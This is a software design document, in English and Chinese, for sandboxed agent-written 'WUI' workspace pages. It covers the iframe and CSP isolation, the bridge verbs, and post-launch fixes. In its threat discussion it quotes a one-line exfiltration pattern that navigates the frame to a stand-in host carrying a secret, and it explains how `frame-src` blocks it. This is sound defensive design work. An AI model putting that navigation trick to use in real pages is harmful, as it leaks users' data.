# Plan — WUI

A **WUI** is a folder in an item's workspace that renders as a live, interactive
page. A domain expert describes what they need, the agent writes the folder, and
the page is usable in the item immediately.

The name is deliberately unfamiliar. Calling it "a web page" tells a domain
person *"that is a software engineer's job"* — the exact association this is
meant to break. WUI is a new word so it gets a new mental slot, and it is
written **WUI** in the UI, as a proper noun.

## Why

Today: the people who understand the domain do not write software, and the people
who write software do not understand the domain. They meet through a URD, and the
delivery date is whatever the engineering schedule allows. Requests that are not
important enough **starve**.

WUI moves that class of work off the engineering schedule. The engineer's output
shifts from *building the application* to *publishing the capability* (a tool) —
they do that once, and N domain experts assemble pages on top of it. If every WUI
still needed an engineer, the bottleneck would only have moved, not gone.

**Success is not "a WUI renders."** It is: one real request that would have
starved, built by someone who does not write software, and still in use a while
later. That is the bar the phases below are scoped against.

## Shape

```
銷售儀表板/                 ← the WUI (a folder, nothing registers it)
  page.ai.yaml            ← `view: wui` — the marker AND the declaration
  index.html              ← the entry
  app.js  style.css       ← inlined at render time
```

Opening `page.ai.yaml` renders the page. It is a `*.ai.yaml` view like
`board.ai.yaml`, so it needs no new file-tree concept, no registry and no
"publish" step — it is simply there, and clicking it runs it.

```
┌─ workspace pane ───────────────────────────────┐
│  [↻ refresh]  [⌖ report]                       │
│ ┌─ iframe: sandbox="allow-scripts", NO         │
│ │  allow-same-origin ⇒ origin is `null`        │
│ │  + injected CSP: default-src 'none'          │
│ │  + injected runtime (ours, always present)   │
│ │                                              │
│ │      the agent's HTML / CSS / JS             │
│ └──────────── postMessage ─────────────────────┤
│                    │  the ONLY way out         │
│  bridge (parent) ──┴─► existing HTTP routes    │
│                    └─► callTool ─► sandbox     │
└────────────────────────────────────────────────┘
```

The browser, not our code, enforces the boundary: a null-origin frame cannot read
cookies, cannot touch the parent DOM, and cannot fetch our API. `postMessage` is
the only channel, so the parent is the gate.

**CSP blocks the network, not inlining.** The page is one self-contained
document, so inline script/style must be allowed or nothing runs. What is taken
away is *reaching out*. This matters more than it first looks: CORS would still
let a request **leave** a null origin (it only withholds the response), so
"cannot read the answer" is not "cannot exfiltrate". `default-src 'none'` with no
`connect-src` of its own is what actually closes it.

**And it is not enough on its own.** CSP has no directive a document can use to
stop ITSELF navigating — `navigate-to` was dropped from CSP3 and never shipped —
so `location.href = "https://x/?d=" + secret` walked past every clause above,
measured in Chromium with fetch, beacon, WebSocket, image, popup, nested frame
and form submission all confirmed refused. The close is `SPA_CSP`'s `frame-src`
on the CONTAINING document (`api/spa.py`), the only actor with a say over a
child frame's navigation. It also removes the second half of the same hole: a
navigated-away frame keeps its `WindowProxy`, so the parent's replies —
necessarily `postMessage(…, "*")`, since an opaque origin cannot be named —
would have been handed to whatever then occupied it.

## Locked decisions

Each of these was argued and settled; the reason is the part worth keeping.

1. **Inside the platform, for signed-in users, inside one item.** Not a public
   URL. Anonymous access would need a second auth story and would point an
   LLM-written page at the open internet.
2. **Only "layer 1": open it from the file tree.** No tab-bar entry, no promotion
   into `profiles/default/`. A WUI lives in the item that made it and does not
   propagate. Copying a folder elsewhere later stays possible precisely because
   nothing registers it.
3. **State lives in workspace files.** Not a private store: what the page writes,
   the agent can read on its next turn, and the human can see in the tree. A page
   with its own invisible storage would kill "ask the AI to change it", which is
   the entire reason to do this here.
4. **Reads the whole item workspace; writes and deletes only its own folder.**
   Read broadly (secondary analysis of the item's real data is a first-class use);
   write narrowly, so a page cannot overwrite `notes.md` or the folder next door.
   A view file at the workspace **root** has no folder of its own, and the honest
   reading of "only its own folder" is then *nothing*: it can read, and every
   write is refused. Treating it as the whole workspace — which is what shipped
   first, with a test pinning it — deleted the invariant for exactly the case a
   hand-written view file reaches.
5. **A folder is a WUI iff it contains a `*.ai.yaml` with `view: wui`.** Inferring
   from "has an `index.html`" would misfire on a downloaded page or an exported
   report. Explicit opt-in, and the yaml is where the declaration lives — so no
   `<meta>` parsing and no second manifest format beside `app.json`.
6. **Capability ceiling is `app.json`, per tool, opt-in.** Enabling a new external
   system is legitimately engineering work; the tool has to exist anyway, so
   naming it in `app.json` costs nothing extra. The bottleneck being broken is
   *building applications*, not *onboarding external systems*.
7. **The bridge has seven verbs and the set is CLOSED.** `listFiles` `readFile`
   `writeFile` `deleteFile` `openFile` `whoami` go to the HTTP routes the FE
   already calls; `callTool` is the one new execution path. **Every future
   capability arrives through `callTool`**, so the bridge never grows and the
   security surface stays a fixed size.
   - `deleteFile` is granted because **write already subsumes destruction** in the
     same scope (overwrite with nothing). Refusing delete removes no risk and
     leaves a page unable to clean up files it created, which only grows quota.
   - **The agent's BUILT-IN tools are not reachable** (`read_file`, `exec`, …).
     Not "first-party", which in this codebase names the bundled `sample-tools`
     packages — those ARE reachable. And not for semantic reasons, which a
     whitelist could fix, but for *type* reasons: `read_file_impl` truncates by
     line and char budget, appends `[truncated: …]` **to the data**, returns
     errors as prose (`"error: file not found: …"`), and decodes with
     `errors="replace"`. Those are correct choices for an LLM and wrong for a
     program: a page reading its own `data.json` gets JSON that fails to parse,
     or worse, parses with half the rows.
   - **One facade, several faces.** A tool is the LLM's face of a capability; an
     HTTP route is the UI's face; `mcp_runner` is the MCP face. A WUI is a
     program, so it takes the program's face.
8. **`callTool` reaches tools that go through the package contract**
   (`PackageInfo`) — today `sample-tools/` plus third-party, tomorrow MCP. Defined
   by contract, never by provenance, so retiring second-party tools changes
   nothing here and leaves no special case behind.
9. **No auto-reload and no push.** Code changes do not reload the page; a refresh
   button rebuilds the iframe. But **`file_changed` IS forwarded into the frame**,
   because that event is already the platform's "someone else edited" cue — a
   page that is an editor and never hears it will silently overwrite other
   people's work. Forwarding is not reloading: the page decides what to do,
   because only it knows about the half-filled form. Conflicts stay
   **last-write-wins**, as everywhere else in the platform.
10. **No babysitting.** No write throttling, no tool-call concurrency limit. A
    wasteful WUI is visible, attributable, and fixable by fixing the WUI. Building
    machinery for an unmeasured problem is inferring a defect from call counts.
    **Guardrails only cover what a user cannot fix by editing their page**: the
    CSP (both of them), the folder write scope, and the capability declaration.
    One bound sits on OUR side of the line and belongs there — the pane keeps at
    most `MAX_REPORTS` reports. That is not policing how well the page runs; an
    unbounded list re-rendered per message freezes the whole workspace, including
    the button that would clear it, so the thing being protected is the app
    around the page, not the page.
11. **The agent learns WUI from a shared skill, not the system prompt.** A skill
    is a folder (`SKILL.md` + `references/` + a complete runnable example) whose
    body loads on demand, so a turn that never mentions WUI pays two lines. The
    example is deliberately an **editor**, the shape that trips on every hazard
    at once (debounce, `file_changed`, folder scope) — copying beats generating
    for small local models.
    - The list of tools this app exposes to `callTool` is **dynamic** and cannot
      live in the skill. The model cannot tell `data-fetch` from `read_file` by
      name, so the host names the WUI-callable set explicitly, appended to the
      skill body at read time (`describe_wui_tools`) off the SAME resolved
      packages and allow-list the turn's toolset was built from. Where a caller
      has no resolved toolset to ask, the section is omitted rather than rendered
      empty: "this app grants none" and "nobody asked" are different claims.
12. **Errors are caught by our injected runtime, never by the agent's code.** A
    blank page is where "the domain expert does it themselves" breaks: they cannot
    open a console, and the agent cannot see the browser. The runtime catches
    `window.onerror`, unhandled rejections and every bridge refusal, shows them in
    the pane in plain language, and offers one button that hands the text to the
    agent. A bridge refusal must therefore read as a sentence, not a `false`.
13. **A pick mode, on the same injected runtime.** The user circles the part that
    looks wrong and it goes to the agent with their comment. Because the parent
    cannot reach into a null-origin frame, this can *only* be done from inside,
    and the only trustworthy code inside is ours. It sends the element's
    `outerHTML`, its `getBoundingClientRect`, and key computed styles — the last
    is what lets a model reason about "it looks squashed" at all. **No screenshot**
    (needs a library the CSP will not let us fetch) and **no source map** (the
    content is JS-generated; the agent wrote the folder and can find it).
14. **WUI knows about files, not entities.** Entities are an App-level concept —
    PM has plenty of special rules and they live inside PM. WUI is general, so
    coupling it to entities would make it "good in apps that have entities". A
    frontmatter helper belongs in the skill's example, or in an App's own skill.
15. **Discovery is deliberately deferred** until the trial. The skill is
    registered in `SHARED_SKILLS` but declared by **no app** — an app opts in
    with one line in its `agent.skills` when it is ready. Declaring it and
    switching it off is a real alternative (a profile can pin a `skills` list, as
    `pm` already does) and was rejected for a different reason than first written
    down: a declared skill puts a row named `wui` in every item's skill picker,
    which is precisely the finding-out being deferred. The cost is that enabling
    it later is an `app.json` line rather than a per-item toggle. No feature flag,
    nothing to remove. Note the asymmetry: the renderer ships to everyone, so a
    hand-written `view: wui` file already works, and `read_skill("wui")` resolves
    in any app. What is gated is whether the *agent* is TOLD, not whether the
    platform can run one.

## Phases

Flat integers, one commit each. Two sequences, because the work landed as two
pull requests — a commit's `P<n>` is a phase of ITS pull request.

- **P1 — render.** `assemble.ts` (pure: inline the folder's relative refs, inject
  the CSP), the `wui` kind reserved and branched ahead of the entity dispatcher
  (the same route `health` takes, because it needs the file path and wants full
  bleed), and the iframe. Outcome: a hand-written folder renders and runs.
- **P2 — bridge, six verbs.** `postMessage` protocol + the parent dispatcher over
  `FileService`, with the folder write/delete scope (and `..` escapes refused).
  Outcome: a page can read the workspace and persist its own state.
- **P3 — runtime.** Injected error capture + pick mode, the pane's refresh /
  report buttons, and handing a report to the agent. Outcome: a broken page is
  reportable by someone who cannot open a console.
- **P4 — `callTool`.** An item-scoped execution route for package tools, gated by
  the yaml declaration ∩ the `app.json` ceiling. Outcome: external integration.
- **P5 — skill.** `sample-skills/wui/` with the editor example and the reference.
  Outcome: the agent can build one from a plain-language request.

`file_changed` forwarding (decision 9) rides with P2, since it is the same
channel and an editor without it is unsafe.

### PR #769 — the first five

The five above.

### PR #773 — pages that have a build

P1–P5 assumed the files in the folder ARE the page. Once a page can be written
with a bundler that stops being true — the folder holds `src/` (edited) and
`dist/` (rendered), and nothing keeps them together. A `src/` edit with no
rebuild leaves the reader looking at the old page with nothing saying why, which
is the only SILENT failure on this path.

A staleness warning was designed and then dropped: telling someone their page
might be out of date is worse than either rebuilding it or leaving it alone.

- **P1 — the build route.** `POST …/wui/build`, streaming the build's own output
  as SSE. `package.json`'s `scripts.build` decides what a build is (a command
  named in the view file would let an LLM-written page choose what a human's
  click executes); the verb is `execute`, the same one a notebook cell needs.
- **P2 — a build that survives a recycle.** `node_modules/` is not mirrored, so
  the build installs first — `--frozen-lockfile` where there is a lock. Without
  this, the first click after a recycle fails and the remedy is "get someone to
  run pnpm install", which is the friction a WUI exists to remove.
- **P3 — the pane.** A **Rebuild** button for pages that have a build, the log on
  screen while it runs, and an **Auto-rebuild** switch — on by default,
  per page and per viewer, turning itself off for a viewer a 403 says may not run
  things here. Rebuilding on open is what closes the gap for everyone who opens
  the page — not a guarantee, since the manifest read may fail quietly and a
  failed build leaves the old `dist/` up; it is a choice because the cost (a
  sandbox waking, tens of seconds) is real.
- **P4 — the claim ledger.** The skill, the react example's README and
  `docs/wui.md` all said the AI rebuilding in the same turn was the only defence.
  It is still worth doing — the automatic build protects the next person to OPEN
  the page, not the one already looking at it — but it is no longer the only one.

The rest of this sequence was not planned. Each phase is something that only
appeared once the thing was USED — pressed in a browser, or looked at in a
screenshot — which is the argument for doing that before calling a feature done.

- **P5 — what the first real Rebuild found.** Four defects, none visible to a
  test: the build ran in the wrong directory (`exec`'s cwd is the workspace
  root, so a workspace-absolute path names the filesystem root); the sandbox had
  no pnpm; the jail's PATH omitted `/usr/local/bin`, where an image installs
  one; and the log printed the build's ANSI colour codes as literal text.
- **P6 — the built example had no stylesheet.** It rendered as browser defaults
  and asked for two class names nothing defined. Caught by someone looking at a
  screenshot and asking whether it had any CSS at all.
- **P7 — opening and building at once showed a broken page.** The build's
  restore races the page's own reads, so `app.js` and `style.css` come back
  missing for a few seconds. The pane waits now. (The race itself is older and
  wider — see "Known and not fixed".)
- **P8 — a real charting library.** "No network" is about runtime: a UMD build
  in the folder is inlined, and the sandbox has a network to fetch it with, so
  `examples/chart/` makes fetching it the page's build step. Hand-drawing an
  SVG was never the answer, and the skill had never said so.
- **P9 — the log folds away when the build succeeds.** It earns the pane while
  it runs and while something is wrong; after that it is a receipt.
- **P10 — the toggle's label.** "on open" was two words nobody could read.

## Known and not fixed

- **Reads route to a sandbox that is not ready yet.** `files/facade.py`'s
  `_warm` probes that a sandbox EXISTS and never asks `is_ready`, so a read
  landing inside a restore window can answer "not there" over an intact durable
  snapshot — for the agent, the file tree and the entity lists, not only a WUI.
  `.ready` was added in #366 for exactly this ambiguity and the mirror honours
  it; reads do not. Wants its own change.
- **`kind: local` cannot run an npm script in a page's folder.** The sandbox
  directory is named after the item, and an item id contains a colon, so
  `<cwd>/node_modules/.bin` cannot be expressed on `PATH`. The hosted sandbox
  mints uuid directories and is unaffected.

## Deliberately not built

- Detecting staleness. Under "rebuild on open" there is nothing to detect, and a
  warning that a page MIGHT be old asks the reader to do the platform's job.
- Auto-reload, live data push, write throttling, tool concurrency limits (10).
- Screenshots and source maps in the pick report (13).
- Entity access from the bridge (14).
- Cross-item access, `exec`, and asking the agent from inside a page — the last
  would arrive as a tool if it ever does (7).
- Any second manifest format, registry, or "publish" action (2, 5).

---

# 上線後的第二輪(2026-09-04)

PR #773 合併後,實際在 prod 用起來才浮出的東西。順序是「回報 → 診斷 → 修」,每一條都註明
是**已修**、**卡在誰身上**,還是**知情不做**。

## PR #788(8 commits,CI 綠,ready,未合併)

| | 回報的話 | 真因 |
|---|---|---|
| P1 | log 伸展高度比 pane 還高,半個版面空白 | `max-height: 30%` 掛在內層,對著一個被無上限內容撐大的容器算百分比。真瀏覽器量:舊結構 strip 1592px、頁面 **0px** |
| P2 | 「IRequestEnv 沒有注入」 | 兩條 WUI 路由都沒接。`callTool` 已接;**`build` 刻意不接**(見下) |
| P3 | 「AI 好像沒有被推薦使用 react and ts」 | skill 寫「Prefer no build」,把所有頁面導向 vanilla JS。已改為預設 React+TS,附 `wui.d.ts` |
| P4 | 「skill 不夠仔細,應該讓 AI 檢查 tool 的 output」 | `callTool` 的輸出格式是 tool 的契約,平台不保證。已加「先跑一次再寫解析」 |
| P5·P6 | 「13mb 單行 json 過不了 readFile 橋」→ 實際症狀「一直說沒有查到東西」 | **不是大小問題**(13.6MB 實測 232ms 通過)。真因:bare 路徑會把頁面資料夾疊兩次,而那個失敗被當成「第一次開頁」靜音 |
| P7·P8 | 兩輪對抗式 review | 兩輪最嚴重的發現**都是前一輪修法造成的**——見下面的教訓 |

### 這輪最貴的兩個教訓

1. **修了整類,卻沒打到回報的那個實例。** P5 修好「頁面資料夾**以外**的缺檔」,但使用者
   看到的 `/x/x/foo.json` 疊加路徑**還在資料夾裡面**,所以照樣靜音。commit 宣稱結案,
   症狀原封不動。**修完要把使用者貼的那個字串原樣跑一次。**
2. **規則搬家沒把測試帶走。** 判準從 `resolveWritePath` 搬到新的 `isOwnFile`,舊函式的
   測試留在原地繼續綠,新函式守衛是零——三個突變通過了全部 196 條測試。

### 一個被 review 擋下來的安全問題

`IRequestEnv` **不可以進 build**。`dist/` 會落到永久儲存並被組進每一位看這個 item 的人拿到
的文件,而 bundler 的工作就是把環境變數烤進產出物(Vite 的 `loadEnv` 會撈 `VITE_` 開頭的
名字)。per-request 憑證進到那裡 = 一個人的憑證寫進別人下載得到的檔案。

**判準:這條路徑的產出是回給問的那個人,還是變成共享的東西?** 前者注入,後者不注入。

## prod 回報的第二批(進行中,未 commit)

1. ✅ **install 和 build 分開報。** 兩步一個 `&&`、一個結論,失敗在哪一半看不出來;而
   `node_modules` 也答不了(沒有依賴的頁面裝完只剩一個中繼檔,跟裝到一半死掉長一樣)。
   已在兩步之間印 `BUILD_STEP_MARK`,用 `&&` 串,所以**它沒出現就代表 install 是失敗的那半**。
2. ✅ **下載來的函式庫是 build 產物,不可以改。** `chart.umd.js` 躺在資料夾裡跟原始碼長得
   一樣,AI 去改它,下次 Rebuild 直接覆蓋,改動無聲消失。已在 SKILL.md 與 chart 的 README
   明寫。⚠️ 這個陷阱**只存在於不用打包器的流程**;用 Vite 的話函式庫是正常依賴、被編譯進
   `dist/`,沒有散落的副本可以被誤認。
3. ✅ **「任何 npm 套件都能這樣抓」。** skill 只示範 chart.js,AI 就以為能用的只有那一個。
4. ✅ **chart 範例的圖表生命週期缺陷。** 資料變空時 `draw()` 提早 return **沒有 destroy**
   舊圖表,Chart.js 仍在監看 canvas 母節點,版面一動就讀到不存在的 `parentNode`。
   這很可能就是 prod 回報的那個錯誤,而 AI 會把它說成「chart.js 本身的問題」。
5. 🔨 **一個演示完整功能的範例**(`examples/complete/`)。一頁用過整個介面:讀 item 真實
   檔案、真的圖表庫、寫自己的資料、`callTool`(**含 tool 回傳路徑那個實際踩到的案例**)、
   `openFile`、`whoami`、`onFileChanged`、每種失敗都是一句話。React + TS + Vite。
   **還缺**:`styles.css`、`README.md`、實際 build 驗證、釘住用的測試、加進範例表與本文件。

## 已定案、還沒做:給頁面一個自己的網址

**決定(2026-09-04,使用者拍板):打開網址的人必須本來就看得到那個 item。**

所以這是小功能:同一個 app 上一條「沒有外殼」的路由(例如 `/w/{item}/{資料夾}`),整個視窗
就是那一頁。沿用同一個登入、同一組權限檢查、同一個組裝器、同一個 sandbox + CSP +
`frame-src` 信封。**不需要新伺服器、不需要匯出、不需要第二套安全模型。**

⚠️ 網址本身不多給也不少給權限。要發給看不到 item 的人是**另一個層級**的設計(頁面需要比
item 更窄的身分和資料範圍),不在這個決定裡。

## 知情不做

- `listFiles` 對不存在的前綴回空陣列,靜音。平台分不出「空資料夾」和「沒這個資料夾」
  (`walk` 只回檔案),所以沒有依據拒絕。
- item 的 `env_vars` 會蓋過後端自己設的 `PATH`/`HOME`/`NODE_ENV`(`Sandbox.exec` 的契約
  就是使用者的值贏),所以 item 上設 `NODE_ENV=production` 會讓 pnpm 跳過 devDependencies、
  `tsc` 消失、Rebuild 全壞。要不要擋保留字是平台層級政策,不塞在 WUI 的 PR 裡。
- **知識庫那組 tool(9 個)頁面碰不到**,沒被考慮過,是最有機會被要求的一組。設計上的規矩
  是:新能力一律以 **package tool** 的形式出現,不加新的 bridge 動詞——要信任的程式碼面積
  才不會長大。所以正確形狀是一個 `ask_kb` 的 package tool,不是 `workspace.askKnowledgeBase()`。
